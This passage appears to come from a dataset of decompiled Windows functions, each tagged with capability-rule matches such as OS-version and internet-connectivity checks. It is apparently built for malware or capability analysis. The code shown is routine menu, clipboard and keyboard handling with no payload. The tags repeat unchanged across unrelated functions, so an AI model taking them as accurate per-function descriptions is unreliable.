        "decompiled_code": "\nvoid fcn.004317b8(void)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffc8;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    int32_t var_10h;\n    ushort uFormat;\n    uint hMem;\n    int32_t *var_4h;\n    \n    puStack28 = 0x4317cc;\n    var_4h = in_EAX;\n    (**(*in_EAX + 0x18))();\n    uStack32 = 0x43182d;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    puStack28 = &stack0xfffffffc;\n    fcn.00431378();\n    var_10h = 0;\n    fcn.00427480(&fcn.004317b8::var_10h);\n    sub.user32.dll_SetClipboardData(uFormat, hMem);\n    if (var_10h != 0) {\n        in_stack_ffffffc8 = 9;\n        sub.user32.dll_SetClipboardData(9, var_10h);\n    }\n    *in_FS_OFFSET = in_stack_ffffffc8;\n    (**(*var_4h + 0x14))(0x431834);\n    return;\n}\n",
        "token_count": 293
    },
    "0043183c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043183c(uint param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffc8;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    int32_t var_10h;\n    ushort uFormat;\n    uint hMem;\n    int32_t *var_4h;\n    \n    puStack28 = 0x431850;\n    var_4h = in_EAX;\n    (**(*in_EAX + 0x18))();\n    uStack32 = 0x4318b1;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    puStack28 = &stack0xfffffffc;\n    fcn.00431378();\n    var_10h = 0;\n    (**(*param_2 + 0x60))(&fcn.0043183c::var_10h);\n    sub.user32.dll_SetClipboardData(uFormat, hMem);\n    if (var_10h != 0) {\n        in_stack_ffffffc8 = 9;\n        sub.user32.dll_SetClipboardData(9, var_10h);\n    }\n    *in_FS_OFFSET = in_stack_ffffffc8;\n    (**(*var_4h + 0x14))(0x4318b8);\n    return;\n}\n",
        "token_count": 313
    },
    "00431a18": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.00431a18(void)\n\n{\n    if (*0x49abc8 == 0) {\n        *0x49abc8 = fcn.00404620();\n    }\n    return *0x49abc8;\n}\n",
        "token_count": 54
    },
    "00431c34": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00431c34(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    \n    if (*0x49abf4 != NULL) {\n        iVar2 = (**0x49abf4)(arg_8h, arg_ch, arg_10h, arg_14h);\n        if (iVar2 != 0) {\n            uVar1 = 1;\n            goto code_r0x00431c60;\n        }\n    }\n    uVar1 = 0;\ncode_r0x00431c60:\n    return -uVar1;\n}\n",
        "token_count": 153
    },
    "00431c68": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00431c68(uint arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    \n    if (*0x49abf8 != NULL) {\n        iVar2 = (**0x49abf8)(arg_8h);\n        if (iVar2 != 0) {\n            uVar1 = 1;\n            goto code_r0x00431c88;\n        }\n    }\n    uVar1 = 0;\ncode_r0x00431c88:\n    return -uVar1;\n}\n",
        "token_count": 124
    },
    "0043216c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.0043216c(void)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    \n    uVar1 = 0;\n    if ((in_EAX != 0) && ((*(in_EAX + 0x1c) & 0x10) != 0)) {\n        if (*0x49ac08 == 0) {\n            *0x49ac08 = sub.user32.dll_RegisterWindowMessageA(0x4321b0);\n        }\n        uVar1 = fcn.00451ae8(0);\n        uVar1 = uVar1 & 0xffffff00 | uVar1 == 100;\n    }\n    return uVar1;\n}\n",
        "token_count": 157
    },
    "004321c4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.004321c4(void)\n\n{\n    if (*0x49ac04 == 0) {\n        *0x49ac04 = (**(*0x4933a4 + 4))();\n    }\n    return *0x49ac04;\n}\n",
        "token_count": 60
    },
    "0043228c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0043228c(uint param_1, uint32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    if ((*(in_EAX + 6) != '\\0') && (*(in_EAX + 8 + (param_2 & 0xff) * 4) == 0)) {\n        uVar1 = (***0x495910)(0, *((param_2 & 0x7f) * 4 + 0x4933ac));\n        *(in_EAX + 8 + (param_2 & 0x7f) * 4) = uVar1;\n    }\n    return *(in_EAX + 8 + (param_2 & 0xff) * 4);\n}\n",
        "token_count": 172
    },
    "004322cc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.004322cc(void)\n\n{\n    int32_t in_EAX;\n    \n    if (((*(in_EAX + 5) != '\\0') && (*(in_EAX + 6) != '\\0')) && (*(in_EAX + 4) != '\\0')) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 75
    },
    "004323cc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004323cc(uint arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint in_ECX;\n    uint in_EDX;\n    uint var_8h;\n    uint var_4h;\n    \n    if ((arg_ch == '\\0') || (arg_10h == 0)) {\n        cVar1 = '\\x01';\n    }\n    else {\n        uVar2 = fcn.0043228c(*(arg_10h + 4), *(arg_10h + 8));\n        iVar3 = (***0x4958d8)(uVar2);\n        cVar1 = '\\x01' - (iVar3 == 0);\n    }\n    if (cVar1 != '\\0') {\n        (***0x495ae4)(in_EDX, in_ECX, arg_8h);\n    }\n    return;\n}\n",
        "token_count": 214
    },
    "00432a04": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00432a04(void)\n\n{\n    uchar uVar1;\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 6) != '\\0') {\n        fcn.004322f8();\n    }\n    uVar1 = fcn.0042f914();\n    *(in_EAX + 6) = uVar1;\n    return;\n}\n",
        "token_count": 84
    },
    "00432a20": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00432a20(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    \n    if (in_EAX == 0) {\n        return 0;\n    }\n    if ((*(in_EAX + 0x1c) & 0x10) == 0) {\n        fcn.004321c4();\n        cVar1 = fcn.004322cc();\n        if (cVar1 == '\\0') goto code_r0x00432a3d;\ncode_r0x00432a67:\n        uVar2 = 1;\n    }\n    else {\ncode_r0x00432a3d:\n        if (((*(in_EAX + 0x1c) & 0x10) != 0) && (*(in_EAX + 0x30) != 0)) {\n            fcn.004321c4();\n            cVar1 = fcn.004322cc();\n            if ((cVar1 != '\\0') && (cVar1 = fcn.0043216c(),  cVar1 == '\\0')) goto code_r0x00432a67;\n        }\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 272
    },
    "00432a6c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00432a6c(void)\n\n{\n    uchar *puVar1;\n    uint *in_FS_OFFSET;\n    uint uStack16;\n    uint uStack12;\n    uchar *puStack8;\n    \n    puStack8 = &stack0xfffffffc;\n    uStack12 = 0x432ab1;\n    uStack16 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack16;\n    *0x49ac00 = *0x49ac00 + 1;\n    if (*0x49ac00 == 0) {\n        puVar1 = &stack0xfffffffc;\n        if (**0x4957e8 == '\\0') {\n            fcn.00404650();\n            puVar1 = puStack8;\n        }\n        puStack8 = puVar1;\n        fcn.00405530();\n    }\n    *in_FS_OFFSET = uStack16;\n    return;\n}\n",
        "token_count": 199
    },
    "00433adc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2h\n// WARNING: Removing unreachable block (ram,0x00433c4d)\n// WARNING: Removing unreachable block (ram,0x00433c5a)\n// WARNING: Removing unreachable block (ram,0x00433c67)\n// WARNING: Removing unreachable block (ram,0x00433c6d)\n// WARNING: Removing unreachable block (ram,0x00433c7a)\n// WARNING: Removing unreachable block (ram,0x00433c80)\n// WARNING: Removing unreachable block (ram,0x00433c8d)\n\nvoid fcn.00433adc(void)\n\n{\n    uint8_t in_AL;\n    uint32_t uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_ch;\n    uint var_8h;\n    uint var_2h;\n    \n    puStack28 = &fcn.00433adc::var_2h + 2;\n    uStack32 = 0x433cbb;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    uVar1 = in_AL;\n    if (uVar1 < 0x2d) {\n        if (uVar1 - 8 < 2) {\n            puStack28 = &fcn.00433adc::var_2h + 2;\n            fcn.004055c8();\n            goto code_r0x00433c47;\n        }\n        if (uVar1 == 0xd) {\n            puStack28 = &fcn.00433adc::var_2h + 2;\n            fcn.004055c8();\n            goto code_r0x00433c47;\n        }\n        if (uVar1 == 0x1b) {\n            puStack28 = &fcn.00433adc::var_2h + 2;\n            fcn.004055c8();\n            goto code_r0x00433c47;\n        }\n        if (uVar1 - 0x20 < 9) {\n            puStack28 = &fcn.00433adc::var_2h + 2;\n            fcn.004055c8();\n            goto code_r0x00433c47;\n        }\n    }\n    else if (uVar1 < 0x41) {\n        if (uVar1 - 0x2d < 2) {\n            puStack28 = &fcn.00433adc::var_2h + 2;\n            fcn.004055c8();\n            goto code_r0x00433c47;\n        }\n        if (uVar1 - 0x30 < 10) {\n            puStack28 = &fcn.00433adc::var_2h + 2;\n            fcn.00405718();\n            goto code_r0x00433c47;\n        }\n    }\n    else {\n        if (uVar1 - 0x41 < 0x1a) {\n            fcn.00405718();\n            goto code_r0x00433c47;\n        }\n        if (uVar1 - 0x60 < 10) {\n            puStack28 = &fcn.00433adc::var_2h + 2;\n            fcn.00405718();\n            goto code_r0x00433c47;\n        }\n        if (uVar1 - 0x70 < 0x18) {\n            puStack28 = &fcn.00433adc::var_2h + 2;\n            fcn.00409d78();\n            fcn.00405864();\n            goto code_r0x00433c47;\n        }\n    }\n    puStack28 = &fcn.00433adc::var_2h + 2;\n    fcn.00433a88();\ncode_r0x00433c47:\n    fcn.00405530();\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x433cc2;\n    uStack32 = 0x433cba;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 900
    },
    "00433ec0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nchar __cdecl fcn.00433ec0(uint *arg_8h)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    code *in_ECX;\n    int32_t in_EDX;\n    char var_9h;\n    uint var_8h;\n    uint var_4h;\n    \n    if (in_EDX != 0) {\n        var_9h = '\\0';\n        while (var_9h == '\\0') {\n            iVar1 = fcn.0043653c();\n            if (iVar1 <= *in_EAX) {\n                return '\\0';\n            }\n            iVar1 = fcn.0043654c();\n            if (*(arg_8h + -1) <= *(iVar1 + 0x3f) && *(iVar1 + 0x3f) != *(arg_8h + -1)) {\n                return '\\0';\n            }\n            var_9h = (*in_ECX)(*arg_8h);\n            *in_EAX = *in_EAX + 1;\n        }\n    }\n    return var_9h;\n}\n",
        "token_count": 240
    },
    "00433f24": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00433f24(int32_t param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    char var_16h;\n    uint8_t var_15h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    var_10h = 0;\n    var_14h = 0;\n    iVar2 = 0;\n    iVar3 = 0;\n    if (param_2 != 0) {\n        iVar2 = fcn.0043653c();\n    }\n    if (param_1 != 0) {\n        iVar3 = fcn.0043653c();\n    }\n    var_16h = '\\0';\n    while ((var_16h == '\\0' && ((var_10h < iVar2 || (var_14h < iVar3))))) {\n        var_1h._0_1_ = 0xff;\n        var_15h = 0xff;\n        if (var_10h < iVar2) {\n            iVar1 = fcn.0043654c();\n            var_1h._0_1_ = *(iVar1 + 0x3f);\n        }\n        if (var_14h < iVar3) {\n            iVar1 = fcn.0043654c();\n            var_15h = *(iVar1 + 0x3f);\n        }\n        if (var_15h < var_1h) {\n            var_1h._0_1_ = var_15h;\n            var_16h = fcn.00433ec0(&var_1h + 1);\n        }\n        else {\n            var_16h = fcn.00433ec0(&var_1h + 1);\n        }\n        while ((var_10h < iVar2 && (iVar1 = fcn.0043654c(),  *(iVar1 + 0x3f) <= var_1h))) {\n            var_10h = var_10h + 1;\n        }\n        while ((var_14h < iVar3 && (iVar1 = fcn.0043654c(),  *(iVar1 + 0x3f) <= var_1h))) {\n            var_14h = var_14h + 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 565
    },
    "004343bc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t __fastcall fcn.004343bc(uint param_1, char param_2)\n\n{\n    ushort uVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    fcn.0041ff70();\n    *(in_EAX + 0x3e) = 1;\n    *(in_EAX + 0x39) = 1;\n    *(in_EAX + 0x3b) = 2;\n    *(in_EAX + 0x3c) = 2;\n    uVar1 = fcn.00433ea0();\n    *(in_EAX + 0x50) = uVar1;\n    *(in_EAX + 0x40) = 0xffffffff;\n    iVar2 = fcn.00404620();\n    *(in_EAX + 0x78) = iVar2;\n    *(iVar2 + 0xc) = in_EAX;\n    *(iVar2 + 8) = 0x436eac;\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack32;\n    }\n    return in_EAX;\n}\n",
        "token_count": 332
    },
    "004344ec": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004344ec(uint8_t param_1, uint param_2)\n\n{\n    uchar *puVar1;\n    uint8_t uVar2;\n    char cVar3;\n    int32_t in_EAX;\n    int32_t iVar4;\n    uint uVar5;\n    uint32_t uVar6;\n    uint *in_FS_OFFSET;\n    uint8_t uVar7;\n    uint in_stack_ffffff88;\n    uint uStack88;\n    uint uStack84;\n    uchar *puStack80;\n    uint var_3ch;\n    uint lpmi;\n    uint var_32h;\n    uint32_t var_2eh;\n    uint32_t var_2ah;\n    uint32_t var_26h;\n    uint var_22h;\n    uint var_1eh;\n    uint var_1ah;\n    uint var_12h;\n    uint8_t var_6h;\n    uint8_t var_5h;\n    uint var_4h;\n    \n    puStack80 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack84 = 0x43473d;\n    uStack88 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack88;\n    puVar1 = &stack0xfffffffc;\n    var_5h = param_1;\n    if (*(in_EAX + 0x3e) == '\\0') goto code_r0x0043471f;\n    fcn.004055c8();\n    iVar4 = fcn.0043653c();\n    if (iVar4 < 1) {\n        if (*(in_EAX + 0x60) != 0) {\n            if ((*(in_EAX + 100) != 0) && (*(*(in_EAX + 100) + 100) == 0)) {\n                cVar3 = fcn.004047dc();\n                if (cVar3 != '\\0') goto code_r0x00434588;\n            }\n            fcn.00433adc(0x434754, var_4h);\n            fcn.004058e0(0);\n        }\n    }\n    else {\n        var_22h = fcn.004349f0();\n    }\ncode_r0x00434588:\n    uVar2 = sub.kernel32.dll_GetVersion();\n    uVar7 = uVar2 == 4;\n    if (uVar2 < 4) {\n        fcn.00405974();\n        uVar6 = *((uVar7 & 0x7f) * 4 + 0x493484) |\n                *(*(in_EAX + 0x48) * 4 + 0x493478) | *(*(in_EAX + 0x38) * 4 + 0x493468) |\n                *(*(in_EAX + 0x39) * 4 + 0x493470);\n        iVar4 = fcn.0043653c();\n        if (iVar4 < 1) {\n            uVar5 = fcn.004059dc();\n            sub.user32.dll_InsertMenuA(param_2, 0xffffffff, uVar6 | 0x400, *(in_EAX + 0x50), uVar5);\n            in_stack_ffffff88 = param_2;\n            puVar1 = puStack80;\n        }\n        else {\n            uVar5 = fcn.004059dc();\n            uVar5 = fcn.004349f0(uVar5);\n            sub.user32.dll_InsertMenuA(param_2, 0xffffffff, uVar6 | 0x410, uVar5);\n            in_stack_ffffff88 = param_2;\n            puVar1 = puStack80;\n        }\n        goto code_r0x0043471f;\n    }\n    lpmi = 0x2c;\n    var_32h = 0x3f;\n    iVar4 = fcn.00436afc();\n    if (iVar4 == 0) {\ncode_r0x004345c8:\n        if (*(in_EAX + 0x4c) != 0) {\n            cVar3 = (**(**(in_EAX + 0x4c) + 0x1c))();\n            uVar2 = cVar3 == '\\0';\n            if (uVar2) goto code_r0x004345de;\n        }\n        var_6h = 0;\n        uVar2 = true;\n    }\n    else {\n        uVar2 = *(iVar4 + 0x40) == '\\0';\n        if (uVar2) {\n            iVar4 = fcn.00436110();\n            uVar2 = iVar4 == 0;\n            if (uVar2) goto code_r0x004345c8;\n        }\ncode_r0x004345de:\n        var_6h = 1;\n    }\n    fcn.00405974();\n    var_2eh = *((uVar2 & 0x7f) * 4 + 0x4934b8) | *(*(in_EAX + 0x3d) * 4 + 0x4934b0) | *(*(in_EAX + 0x48) * 4 + 0x49348c)\n              | *(var_5h * 4 + 0x4934c0) | *(var_6h * 4 + 0x4934c8);\n    var_2ah = *(*(in_EAX + 0x38) * 4 + 0x493498) | *(*(in_EAX + 0x39) * 4 + 0x4934a8) |\n              *(*(in_EAX + 0x3a) * 4 + 0x4934a0);\n    var_26h = *(in_EAX + 0x50);\n    var_22h = 0;\n    var_1eh = 0;\n    var_1ah = 0;\n    var_12h = fcn.004059dc();\n    iVar4 = fcn.0043653c();\n    if (0 < iVar4) {\n        var_22h = fcn.004349f0();\n    }\n    sub.user32.dll_InsertMenuItemA(param_2, 0xffffffff, 0xffffffff, &lpmi);\n    in_stack_ffffff88 = param_2;\n    puVar1 = puStack80;\ncode_r0x0043471f:\n    puStack80 = puVar1;\n    *in_FS_OFFSET = in_stack_ffffff88;\n    fcn.00405530(0x434744);\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 1445
    },
    "004348c0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004348c0(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    bool bVar5;\n    \n    if ((*(in_EAX + 7) & 8) != 0) {\n        return;\n    }\n    if ((*(in_EAX + 7) & 2) != 0) {\n        *(in_EAX + 0x1d) = 1;\n        return;\n    }\n    if (in_EAX[0x1b] != 0) {\n        fcn.004348c0();\n        return;\n    }\n    uVar2 = fcn.004349f0();\n    iVar3 = sub.user32.dll_GetMenuItemCount(uVar2);\n    bVar5 = iVar3 == 0;\n    for (; 0 < iVar3; iVar3 = iVar3 + -1) {\n        uVar2 = fcn.004349f0(iVar3 + -1, 0x400);\n        uVar4 = sub.user32.dll_GetMenuState();\n        if ((uVar4 & 4) == 0) {\n            uVar2 = fcn.004349f0(iVar3 + -1, 0x400);\n            sub.user32.dll_RemoveMenu();\n            bVar5 = true;\n        }\n    }\n    if (!bVar5) {\n        return;\n    }\n    if ((in_EAX[0x19] == 0) && (cVar1 = fcn.004047dc(uVar2),  cVar1 != '\\0')) {\n        uVar2 = fcn.004349f0();\n        iVar3 = sub.user32.dll_GetMenuItemCount(uVar2);\n        if (iVar3 == 0) {\n            sub.user32.dll_DestroyMenu(in_EAX[0xd]);\n            in_EAX[0xd] = 0;\n            goto code_r0x00434980;\n        }\n    }\n    fcn.00434780();\ncode_r0x00434980:\n    (**(*in_EAX + 0x3c))();\n    return;\n}\n",
        "token_count": 470
    },
    "004349f0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.004349f0(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    \n    if (*(in_EAX + 0x34) == 0) {\n        cVar1 = fcn.004047dc();\n        if (cVar1 == '\\0') {\n            uVar2 = sub.user32.dll_CreateMenu();\n            *(in_EAX + 0x34) = uVar2;\n        }\n        else {\n            uVar2 = sub.user32.dll_CreatePopupMenu();\n            *(in_EAX + 0x34) = uVar2;\n        }\n        if (*(in_EAX + 0x34) == 0) {\n            fcn.00433a30();\n        }\n        fcn.00434780();\n    }\n    return *(in_EAX + 0x34);\n}\n",
        "token_count": 187
    },
    "00434c98": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00434c98(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    uint *in_ECX;\n    uint var_10h;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    \n    var_10h = *in_ECX;\n    uStack16 = in_ECX[1];\n    uStack12 = in_ECX[2];\n    uStack8 = in_ECX[3];\n    if (*(in_EAX + 0x92) != 0) {\n        (**(in_EAX + 0x90))(arg_8h, &var_10h);\n    }\n    return;\n}\n",
        "token_count": 149
    },
    "00436110": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00436110(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    \n    uVar2 = 0;\n    for (iVar1 = *(in_EAX + 100); (iVar1 != 0 && (*(iVar1 + 0x7c) == 0)); iVar1 = *(iVar1 + 100)) {\n    }\n    if (iVar1 == 0) {\n        iVar1 = fcn.00436afc();\n        if (iVar1 != 0) {\n            uVar2 = *(iVar1 + 0x48);\n        }\n    }\n    else {\n        uVar2 = *(iVar1 + 0x7c);\n    }\n    return uVar2;\n}\n",
        "token_count": 165
    },
    "0043618c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043618c(int32_t *arg_8h)\n\n{\n    bool bVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t *in_FS_OFFSET;\n    bool bVar5;\n    uchar uVar6;\n    uint32_t uStack64;\n    uint uStack60;\n    uchar *puStack56;\n    uint var_24h;\n    int32_t var_20h;\n    int32_t var_18h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t *var_4h;\n    \n    puStack56 = &stack0xfffffffc;\n    var_8h = 0;\n    uStack60 = 0x43636e;\n    uStack64 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack64;\n    fcn.0040484c();\n    cVar2 = fcn.004047dc();\n    bVar5 = cVar2 == '\\0';\n    if (bVar5) {\n        uVar6 = 1;\n    }\n    else {\n        uVar6 = bVar5;\n        fcn.00436140(&stack0xfffffffc);\n    }\n    bVar5 = !bVar5;\n    iVar3 = fcn.00436afc();\n    var_10h = fcn.00436110();\n    fcn.00405974();\n    if (uVar6) {\n        *arg_8h = 5;\n        *var_4h = -2;\n        bVar1 = false;\n    }\n    else if ((var_10h == 0) || ((0x7fffffff < *(in_EAX + 0x40) && (bVar5)))) {\n        if (*(in_EAX + 0x4c) != 0) {\n            cVar2 = (**(**(in_EAX + 0x4c) + 0x1c))();\n            if (cVar2 == '\\0') {\n                *var_4h = 0x10;\n                if (!bVar5) {\n                    *arg_8h = 0x10;\n                }\n                bVar1 = true;\n                goto code_r0x00436277;\n            }\n        }\n        *var_4h = -7;\n        bVar1 = false;\n    }\n    else {\n        *var_4h = *(var_10h + 0x34);\n        if (!bVar5) {\n            *arg_8h = *(var_10h + 0x30);\n        }\n        bVar1 = true;\n    }\ncode_r0x00436277:\n    if ((bVar1) && (!bVar5)) {\n        *var_4h = *var_4h + 0xf;\n    }\n    if (!bVar5) {\n        *arg_8h = *arg_8h + 3;\n    }\n    fcn.00403af4();\n    if (iVar3 == 0) {\n        cVar2 = fcn.004047dc();\n        if (cVar2 == '\\0') {\n            uVar4 = 0;\n        }\n        else {\n            uVar4 = *0x60;\n        }\n    }\n    else {\n        uVar4 = 0;\n    }\n    if (*(in_EAX + 0x60) == 0) {\n        fcn.004055c8();\n    }\n    else {\n        fcn.00433adc();\n        fcn.00405864();\n    }\n    uVar4 